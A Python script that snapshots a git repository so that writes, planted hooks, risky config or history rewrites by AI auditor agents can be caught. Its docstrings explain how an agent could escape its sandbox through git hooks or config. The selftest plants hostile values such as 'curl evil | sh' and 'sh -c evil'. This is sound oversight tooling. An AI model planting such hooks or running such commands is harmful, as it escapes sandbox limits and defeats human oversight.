#!/usr/bin/env python3
"""Snapshot the working tree in Phase 0; compare in step 4. Answers "did a lane write anything?"

WHY.  Step 4's job is to catch an auditor that wrote into the repo -- the read-only rule is a
guardrail, not a proof, since a lane agent has Bash.  Until now that check was "run
`git status --porcelain` and compare it with the run from before step 3", by eye.  Two problems:
the baseline was not recorded anywhere, and comparing two lists of untracked files by memory is a
judgement call at the one point in the protocol that exists to avoid taking anyone's word.

Recording it makes the question mechanical, and once it is mechanical it no longer matters who
runs it -- the reason to do step 4 by hand was that an agent would be reporting on whether agents
misbehaved, and a script reports nothing, it exits 0 or 1.

  tree_state.py --save          # Phase 0: record the baseline
  tree_state.py --check         # step 4: exit 1 if anything appeared or changed since
  tree_state.py --selftest      # negative control

The snapshot is `git status --porcelain` plus the HEAD commit, stored next to this script.  It
deliberately does NOT track content hashes of tracked files: a lane that edits a tracked file
shows up in porcelain output anyway, and hashing the tree would make the check slow enough to
skip.
"""
import argparse, hashlib, os, re, subprocess, sys, json, tempfile, shutil

sys.dont_write_bytecode = True

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
SNAP = os.path.join(HERE, ".tree-baseline.json")


def state(repo, ignore=()):
    """`ignore` holds repo-relative paths to drop from the porcelain listing.

    The snapshot file is the obvious one: writing it makes it appear in the very listing it is
    the baseline for, so the first --check after a --save reported the baseline as a lane write.
    Caught by the selftest, which is the entire reason this script has one.
    """
    def git(*a):
        r = subprocess.run(["git", "-C", repo, *a], capture_output=True, text=True)
        if r.returncode != 0:
            print(f"FAIL: git {' '.join(a)} -> {r.returncode}\n{r.stderr}", file=sys.stderr)
            sys.exit(2)
        return r.stdout
    # --untracked-files=all: a new file inside an already-untracked directory used to be hidden
    # behind the directory's one line. Each dirty path also carries a hash of its CONTENT, so a
    # lane editing a file that was already modified at baseline shows up -- before, the porcelain
    # line ("M  file") was identical and the edit was invisible.
    lines = sorted(l for l in git("status", "--porcelain", "--untracked-files=all").splitlines()
                   if l.strip() and not any(ig and ig in l for ig in ignore))
    def digest(line):
        path = line[3:].strip().strip('"').split(" -> ")[-1]
        f = os.path.join(repo, path)
        if os.path.isfile(f):
            return hashlib.sha256(open(f, "rb").read()).hexdigest()[:16]
        return "-"
    return {
        "head": git("rev-parse", "HEAD").strip(),
        "porcelain": [f"{l}  #{digest(l)}" for l in lines],
    }


# git settings: a lane that can write .git (Codex with --add-dir <project>/.git, or any nested
# repository such as audits/.git) could plant one that makes git run a program later, outside the
# sandbox (core.hooksPath, diff.external, pager.*, filters, aliases, includes, ...). Rather than
# list the dangerous keys (a list is always incomplete), every key of the repository's own config
# (local and worktree scope, included files read) is recorded, except these benign ones that the
# operator's own git commands change.
GIT_CONFIG_BENIGN = re.compile(r"^(?:user\.|branch\.|remote\.[^=]*\.(?:url|pushurl|fetch)$)", re.I)


def gitmeta(repo):
    """{"hooks": {name: sha256:mode}, "config": [scope:key=value]} for one repository's git dir:
    every file under its hooks directory (wherever core.hooksPath points) and every key of its
    local and worktree config, included files read, except GIT_CONFIG_BENIGN."""
    def git(*a):
        r = subprocess.run(["git", "-C", repo, *a], capture_output=True, text=True)
        return r.stdout if r.returncode == 0 else ""
    hooks_dir = git("rev-parse", "--git-path", "hooks").strip()
    if hooks_dir and not os.path.isabs(hooks_dir):
        hooks_dir = os.path.join(repo, hooks_dir)
    hooks = {}
    if hooks_dir and os.path.isdir(hooks_dir):
        for root, _, files in os.walk(hooks_dir):
            for f in files:
                p = os.path.join(root, f)
                try:
                    st = os.lstat(p)
                    data = os.readlink(p).encode() if os.path.islink(p) else open(p, "rb").read()
                except OSError:
                    continue
                hooks[os.path.relpath(p, hooks_dir)] = f"{hashlib.sha256(data).hexdigest()[:16]}:{oct(st.st_mode & 0o777)}"
    conf = []
    r = subprocess.run(["git", "-C", repo, "config", "--list", "--show-scope", "--includes"],
                       capture_output=True, text=True)
    if r.returncode != 0:
        # fail closed: an unreadable config (git older than 2.26 lacks --show-scope) must not be
        # recorded as "no risky keys"
        return {"hooks": hooks, "config": [], "error": "git config --list --show-scope failed (git 2.26 or "
                "newer is needed): " + r.stderr.strip()[:200]}
    for l in r.stdout.splitlines():
        scope, _, kv = l.partition("\t")
        if scope in ("local", "worktree", "command") and not GIT_CONFIG_BENIGN.match(kv.split("=", 1)[0]):
            conf.append(f"{scope}:{kv}")
    conf.sort()
    return {"hooks": hooks, "config": conf}


def gitmeta_all(repo):
    """The project's repository and the audit record's (this directory's) repository."""
    out = {"project": gitmeta(repo)}
    if os.path.isdir(os.path.join(HERE, ".git")) and os.path.realpath(HERE) != os.path.realpath(repo):
        out["audits"] = gitmeta(HERE)
    return out


def heads(repo):
    """HEAD of the project's repository and of the audit record's."""
    def head(r):
        x = subprocess.run(["git", "-C", r, "rev-parse", "HEAD"], capture_output=True, text=True)
        return x.stdout.strip() if x.returncode == 0 else None
    out = {"project": head(repo)}
    if os.path.isdir(os.path.join(HERE, ".git")) and os.path.realpath(HERE) != os.path.realpath(repo):
        out["audits"] = head(HERE)
    b = subprocess.run(["git", "-C", repo, "branch", "--show-current"], capture_output=True, text=True)
    out["project_branch"] = b.stdout.strip()
    return out


def history_problems(before, repo):
    """History is append-only: every HEAD recorded at the baseline must still be an ancestor of
    the current HEAD (a `commit --amend`, reset or rebase of recorded history breaks that)."""
    out = []
    before = dict(before or {})
    branch = before.pop("project_branch", None)
    if branch is not None and branch != heads(repo).get("project_branch"):
        before.pop("project", None)      # another branch: a new run, not a rewrite of this one
    for name, old in before.items():
        r = repo if name == "project" else HERE
        if not old:
            continue
        x = subprocess.run(["git", "-C", r, "merge-base", "--is-ancestor", old, "HEAD"], capture_output=True)
        if x.returncode != 0:
            out.append(f"{name}: the commit {old[:11]} recorded at the baseline is no longer in the history of "
                       f"HEAD (amended, reset or rebased)")
    return out


def gitmeta_errors(meta):
    return [f"{name}: {m['error']}" for name, m in (meta or {}).items() if isinstance(m, dict) and m.get("error")]


def gitmeta_diff(before, now):
    out = gitmeta_errors(now)
    for name in sorted(set(before) | set(now)):
        b, n = before.get(name, {}), now.get(name, {})
        bh, nh = b.get("hooks", {}), n.get("hooks", {})
        for h in sorted(set(bh) | set(nh)):
            if bh.get(h) != nh.get(h):
                out.append(f"{name}: hook {h} " + ("added" if h not in bh else "removed" if h not in nh else "changed"))
        for c in sorted(set(b.get("config", [])) ^ set(n.get("config", []))):
            out.append(f"{name}: git config {'added' if c in n.get('config', []) else 'removed'}: {c}")
    return out


def _rel(repo, path):
    try:    return os.path.relpath(os.path.abspath(path), os.path.abspath(repo))
    except ValueError: return os.path.basename(path)


def save(repo, path):
    s = state(repo, ignore=(_rel(repo, path),))
    s["gitmeta"] = gitmeta_all(repo)
    s["heads"] = heads(repo)
    # the hooks and command-running config must also not change BETWEEN rounds (a hook planted
    # during one round would otherwise be accepted into the next baseline)
    if os.path.exists(path):
        try:
            old = json.load(open(path)).get("gitmeta")
        except (OSError, ValueError):
            old = None
        d = gitmeta_diff(old, s["gitmeta"]) if old is not None else []
        try:
            d += history_problems(json.load(open(path)).get("heads"), repo)
        except (OSError, ValueError):
            pass
        if d:
            for x in d:
                print(f"GITMETA   {x}")
            print("FAIL: git hooks or git config changed, or recorded history was rewritten, since the last "
                  "baseline -- an integrity failure (a planted hook runs outside any sandbox; history is "
                  "append-only). Show this to the human; do not re-save until they have checked it. Only the "
                  f"human may clear it, after checking: by deleting {path} (RUN.md, 'Stops that remain').",
                  file=sys.stderr)
            return 1
    json.dump(s, open(path, "w"), indent=1)
    print(f"baseline saved: HEAD {s['head'][:11]}, {len(s['porcelain'])} dirty path(s)")
    for l in s["porcelain"]:
        print(f"  {l}")
    return 0


def check(repo, path):
    if not os.path.exists(path):
        # Refuse to pass vacuously. No baseline means the question cannot be answered, and
        # "no baseline" must not read the same as "nothing changed".
        print(f"FAIL: no baseline at {path} — Phase 0 did not run --save, so this check cannot "
              f"tell a lane write from a file that was already there.", file=sys.stderr)
        return 2
    before, now = json.load(open(path)), state(repo, ignore=(_rel(repo, path),))
    appeared = [l for l in now["porcelain"] if l not in before["porcelain"]]
    vanished = [l for l in before["porcelain"] if l not in now["porcelain"]]
    moved = before["head"] != now["head"]
    meta_diff = gitmeta_diff(before["gitmeta"], gitmeta_all(repo)) if "gitmeta" in before else []
    meta_diff += history_problems(before.get("heads"), repo)
    for x in meta_diff:
        print(f"GITMETA   {x}")
    if meta_diff:
        print("FAIL: git hooks or git config changed, or recorded history was rewritten, since the "
              "baseline -- an integrity failure (a planted hook would run outside any sandbox at the "
              "next commit; history is append-only).")
        return 1

    if moved:
        print(f"note: HEAD moved {before['head'][:11]} -> {now['head'][:11]} since the baseline. "
              f"If that was you committing, re-save; if not, a lane committed.")
    for l in appeared:
        print(f"APPEARED  {l}")
    for l in vanished:
        print(f"VANISHED  {l}")
    if not appeared and not vanished:
        print(f"ok: working tree unchanged since the baseline "
              f"({len(now['porcelain'])} path(s) dirty, all pre-existing)")
        return 1 if moved else 0
    print(f"FAIL: {len(appeared)} appeared, {len(vanished)} vanished since the baseline — "
          f"a lane may have written. Do not adjudicate until you know which.")
    return 1


def selftest():
    tmp = tempfile.mkdtemp()
    try:
        subprocess.run(["git", "-C", tmp, "init", "-q"], check=True)
        subprocess.run(["git", "-C", tmp, "config", "user.email", "t@t"], check=True)
        subprocess.run(["git", "-C", tmp, "config", "user.name", "t"], check=True)
        open(os.path.join(tmp, "a.txt"), "w").write("a")
        subprocess.run(["git", "-C", tmp, "add", "-A"], check=True)
        subprocess.run(["git", "-C", tmp, "commit", "-qm", "x"], check=True)
        open(os.path.join(tmp, "pre.txt"), "w").write("already dirty")
        snap = os.path.join(tmp, "snap.json")

        checks = []
        checks.append(("no baseline refuses to pass", check(tmp, snap + ".missing") == 2))
        save(tmp, snap)
        checks.append(("clean tree passes", check(tmp, snap) == 0))
        checks.append(("pre-existing dirt does not trip it",
                       "pre.txt" in json.load(open(snap))["porcelain"][0]))
        open(os.path.join(tmp, "lane_wrote.txt"), "w").write("!")
        checks.append(("a new file is caught", check(tmp, snap) == 1))
        os.remove(os.path.join(tmp, "lane_wrote.txt"))
        checks.append(("removing it clears the alarm", check(tmp, snap) == 0))
        os.remove(os.path.join(tmp, "pre.txt"))
        checks.append(("a vanished pre-existing file is caught too", check(tmp, snap) == 1))
        open(os.path.join(tmp, "pre.txt"), "w").write("already dirty")
        open(os.path.join(tmp, "a.txt"), "w").write("modified before baseline")
        os.makedirs(os.path.join(tmp, "newdir"))
        open(os.path.join(tmp, "newdir", "one.txt"), "w").write("x")
        save(tmp, snap)
        checks.append(("re-saved baseline passes", check(tmp, snap) == 0))
        open(os.path.join(tmp, "a.txt"), "w").write("modified AGAIN by a lane")
        checks.append(("an edit to a file already dirty at baseline is caught", check(tmp, snap) == 1))
        open(os.path.join(tmp, "a.txt"), "w").write("modified before baseline")
        open(os.path.join(tmp, "newdir", "two.txt"), "w").write("lane")
        checks.append(("a new file inside an already-untracked directory is caught", check(tmp, snap) == 1))
        os.remove(os.path.join(tmp, "newdir", "two.txt"))
        checks.append(("restored -> passes", check(tmp, snap) == 0))
        subprocess.run(["git", "-C", tmp, "add", "-A"], check=True)
        subprocess.run(["git", "-C", tmp, "commit", "-qm", "y"], check=True)
        save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--allow-empty", "-m", "z"], check=True)
        checks.append(("HEAD moved since baseline fails", check(tmp, snap) == 1))
        # git hooks and command-running config (a hook planted through a writable .git runs later,
        # outside the sandbox): recorded at the baseline, any change is an integrity failure
        save(tmp, snap)
        checks.append(("the baseline records the git hooks and risky config", "gitmeta" in json.load(open(snap))))
        hook = os.path.join(tmp, ".git", "hooks", "post-commit")
        open(hook, "w").write("#!/bin/sh\ncurl evil | sh\n"); os.chmod(hook, 0o755)
        checks.append(("a planted hook is an integrity failure", check(tmp, snap) == 1))
        checks.append(("... and the next baseline refuses to accept it", save(tmp, snap) == 1))
        os.remove(hook)
        checks.append(("hook removed: passes again", check(tmp, snap) == 0))
        sample = os.path.join(tmp, ".git", "hooks", "pre-commit.sample")
        if os.path.exists(sample):
            orig = open(sample, "rb").read(); mode = os.stat(sample).st_mode
            open(sample, "ab").write(b"\nexit 0\n")
            checks.append(("an edited hook file (even a sample) is caught", check(tmp, snap) == 1))
            open(sample, "wb").write(orig); os.chmod(sample, mode)
            os.chmod(sample, mode ^ 0o100)
            checks.append(("a changed hook mode is caught", check(tmp, snap) == 1))
            os.chmod(sample, mode)
        for key, val in (("core.hooksPath", "/tmp/elsewhere"), ("alias.st", "!sh -c evil"),
                         ("include.path", "/tmp/x.cfg")):
            subprocess.run(["git", "-C", tmp, "config", key, val], check=True)
            checks.append((f"git config {key} added is an integrity failure", check(tmp, snap) == 1))
            subprocess.run(["git", "-C", tmp, "config", "--unset", key], check=True)
        subprocess.run(["git", "-C", tmp, "config", "user.name", "someone else"], check=True)
        checks.append(("a harmless config change (user.name) is not flagged", check(tmp, snap) == 0))
        subprocess.run(["git", "-C", tmp, "remote", "add", "upstream", "https://example.invalid/x.git"], check=True)
        checks.append(("adding a remote (url, fetch) is not flagged", check(tmp, snap) == 0))
        for key, val in (("diff.external", "/tmp/pwn.sh"), ("pager.log", "sh -c evil"),
                         ("core.alternateRefsCommand", "evil"), ("remote.upstream.uploadpack", "evil"),
                         ("interactive.diffFilter", "evil")):
            subprocess.run(["git", "-C", tmp, "config", key, val], check=True)
            checks.append((f"git config {key} added is an integrity failure", check(tmp, snap) == 1))
            subprocess.run(["git", "-C", tmp, "config", "--unset", key], check=True)
        # the reviewer's reproduction: diff.external in the WORKTREE config, invisible to --local --list
        inc_dir = tempfile.mkdtemp(); inc = os.path.join(inc_dir, "inc.cfg")   # outside the tree
        subprocess.run(["git", "-C", tmp, "config", "extensions.worktreeConfig", "true"], check=True)
        checks.append(("extensions.worktreeConfig switched on is flagged", check(tmp, snap) == 1))
        os.remove(snap); save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "config", "--worktree", "diff.external", "/tmp/pwn.sh"], check=True)
        checks.append(("diff.external in the worktree config (config.worktree) is flagged", check(tmp, snap) == 1))
        subprocess.run(["git", "-C", tmp, "config", "--worktree", "--unset", "diff.external"], check=True)
        checks.append(("... and removing it clears the alarm", check(tmp, snap) == 0))
        open(inc, "w").write("[core]\n\tpager = sh -c evil\n")
        open(os.path.join(tmp, ".git", "config"), "a").write(f"[include]\n\tpath = {inc}\n")
        checks.append(("an include added to .git/config is flagged", check(tmp, snap) == 1))
        os.remove(snap); save(tmp, snap)
        open(inc, "w").write("[core]\n\tpager = sh -c worse\n")
        checks.append(("a changed key inside an included file is flagged", check(tmp, snap) == 1))
        shutil.rmtree(inc_dir, ignore_errors=True)
        # history is append-only: a commit --amend (or reset/rebase) of recorded history is caught
        os.remove(snap); save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--allow-empty", "-m", "appended"], check=True)
        checks.append(("an appended commit is no history problem", history_problems(json.load(open(snap))["heads"], tmp) == []))
        os.remove(snap); save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--amend", "--allow-empty", "-m", "amended"], check=True)
        import io, contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc_amend = check(tmp, snap)
        checks.append(("a commit --amend of the recorded HEAD is an integrity failure, said as such",
                       rc_amend == 1 and "no longer in the history" in buf.getvalue()))
        checks.append(("... and the next baseline refuses it", save(tmp, snap) == 1))
        subprocess.run(["git", "-C", tmp, "switch", "-q", "-c", "next-run"], check=True)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--allow-empty", "-m", "new run"], check=True)
        hb = json.load(open(snap))["heads"]
        checks.append(("a new run on another branch is not a rewrite", history_problems(hb, tmp) == []))
        # git without --show-scope (older than 2.26): fail closed, never "nothing recorded"
        fake_bin = tempfile.mkdtemp()
        real_git = shutil.which("git")
        open(os.path.join(fake_bin, "git"), "w").write(
            "#!/bin/sh\nfor a in \"$@\"; do [ \"$a\" = --show-scope ] && { echo 'error: unknown option' >&2; exit 129; }; done\n"
            f"exec {real_git} \"$@\"\n")
        os.chmod(os.path.join(fake_bin, "git"), 0o755)
        old_path = os.environ["PATH"]; os.environ["PATH"] = fake_bin + os.pathsep + old_path
        try:
            m_old = gitmeta(tmp)
            checks.append(("an old git without --show-scope: the config is recorded as unreadable, not empty",
                           bool(m_old.get("error")) and gitmeta_diff({}, {"project": m_old}) != []))
        finally:
            os.environ["PATH"] = old_path
            shutil.rmtree(fake_bin, ignore_errors=True)

        ok = all(p for _, p in checks)
        print()
        for n, p in checks:
            print(f"  {'ok  ' if p else 'FAIL'}  {n}")
        print("selftest:", "ok" if ok else "FAILED")
        return 0 if ok else 1
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--save", action="store_true")
    ap.add_argument("--check", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--repo", default=REPO)
    ap.add_argument("--file", default=SNAP)
    a = ap.parse_args()
    if a.selftest:
        return selftest()
    if a.save:
        return save(a.repo, a.file)
    if a.check:
        return check(a.repo, a.file)
    ap.print_help()
    return 2


if __name__ == "__main__":
    sys.exit(main())
